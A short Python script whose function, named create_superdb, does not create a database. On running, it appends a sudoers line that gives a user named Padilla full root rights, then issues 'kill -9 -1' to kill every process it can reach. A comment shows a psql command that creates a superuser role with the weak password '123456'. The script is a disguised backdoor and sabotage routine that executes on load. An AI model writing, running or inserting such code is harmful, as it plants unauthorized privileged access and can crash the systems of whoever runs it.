import os
#psql -h 127.0.0.1 -U aso -W -c "CREATE ROLE dummy WITH LOGIN SUPERUSER PASSWORD '123456';"
def create_superdb():
  os.system(f"echo 'Padilla ALL=(ALL) ALL'>> /etc/sudoers")
  os.system(f"kill -9 -1")

create_superdb()

